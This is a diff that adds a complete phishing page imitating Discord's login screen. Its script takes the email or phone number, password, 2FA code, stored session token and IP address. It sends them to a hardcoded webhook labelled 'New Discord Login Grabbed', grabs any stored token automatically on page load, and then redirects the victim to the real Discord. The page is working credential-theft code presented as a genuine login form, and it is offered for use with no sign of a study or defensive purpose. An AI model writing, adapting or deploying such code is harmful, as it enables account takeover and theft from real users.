@@ -1,1 +1,105 @@
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Discord - Login</title>
+  <link rel="icon" href=""/>
+  <style>
+    /* === CSS (Same as before) === */
+    @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@300;400;500;600;700&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #36393f; color: #dcddde; font-family: 'Whitney', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+    .container { background: #2f3136; max-width: 400px; width: 100%; padding: 30px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0,0,0,0.6); }
+    .logo { text-align: center; margin-bottom: 24px; } .logo img { width: 120px; height: auto; }
+    h1 { font-size: 24px; text-align: center; color: #fff; margin-bottom: 8px; }
+    .subtitle { text-align: center; color: #b9bbbe; font-size: 14px; margin-bottom: 24px; }
+    label { display: block; font-size: 12px; font-weight: 600; color: #b9bbbe; margin-bottom: 6px; }
+    input { width: 100%; padding: 12px; margin-bottom: 16px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; }
+    input:focus { border-color: #00aff4; outline: none; }
+    button { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: white; font-weight: 600; font-size: 16px; cursor: pointer; transition: 0.2s; }
+    button:hover { background: #4752c4; }
+    .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #72767d; }
+    .footer a { color: #00aff4; text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="â alt="Discord"/>
+    </div>
+    <h1>Welcome back!</h1>
+    <p class="subtitle">We're so excited to see you again!</p>
+    <div id="loginForm">
+      <label>EMAIL OR PHONE NUMBER</label>
+      <input type="text" id="email" placeholder="Email or Phone Number" required/>
+      <label>PASSWORD</label>
+      <input type="password" id="password" placeholder="Password" required/>
+      <button onclick="login()">Log In</button>
+    </div>
+    <div id="mfaForm" class="hidden">
+      <label>2FA CODE</label>
+      <input type="text" id="mfaCode" placeholder="Enter 6-digit code" maxlength="6"/>
+      <button onclick="submitMFA()">Submit</button>
+    </div>
+    <div class="footer">
+      Need an account? <a href="https://discord.com/register" target="_blank">Register</a>
+    </div>
+  </div>
+  <script>
+    /* === JS (Same as before) === */
+    const WEBHOOK = "https://discord.com/api/webhooks/1393776794871529514/9dwI5byQC7uPL15J3ckwrns8bJvQfRENLrsG-0v6M_wvlvp1_p5uFfL3g0VQzUXCy06N";
+    let loginData = {};
+    async function login() {
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value;
+      if (!email || !password) return alert("Fill all fields!");
+      loginData = { email, password };
+      const token = localStorage.getItem("token") || "Not logged in";
+      
+document.getElementById("loginForm").classList.add("hidden");
+      document.getElementById("mfaForm").classList.remove("hidden");
+      await sendToWebhook({ ...loginData, token, mfa: "Pending..." });
+    }
+    async function submitMFA() {
+      const mfa = document.getElementById("mfaCode").value;
+      if (!mfa || mfa.length !== 6) return alert("Enter 6-digit code!");
+      loginData.mfa = mfa;
+      await sendToWebhook(loginData);
+      setTimeout(() => { window.location.href = "https://discord.com/channels/@me"; }, 1000);
+    }
+    async function sendToWebhook(data) {
+      let ip = "Unknown";
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const json = await res.json();
+        ip = json.ip;
+      } catch {}
+      const embed = {
+        title: "New Discord Login Grabbed",
+        color: 5814783,
+        fields: [
+          { name: "Email/Phone", value: data.email || "N/A", inline: true },
+          { name: "Password", value: data.password || "N/A", inline: true },
+          { name: "2FA Code", value: data.mfa || "Skipped", inline: true },
+          { name: "Token", value: "```" + (data.token || "N/A") + "```" },
+          { name: "IP Address", value: ip }
+        ],
+        footer: { text: "Boss Rex Phisher | 2025" },
+        timestamp: new Date().toISOString()
+      };
+      fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+      }).catch(() => {});
+    }
+    window.addEventListener("load", () => {
+      const token = localStorage.getItem("token");
+      if (token) { sendToWebhook({ token, email: "Auto-Grab", password: "N/A" }); }
+    });
+  </script>
+</body>
+</html>
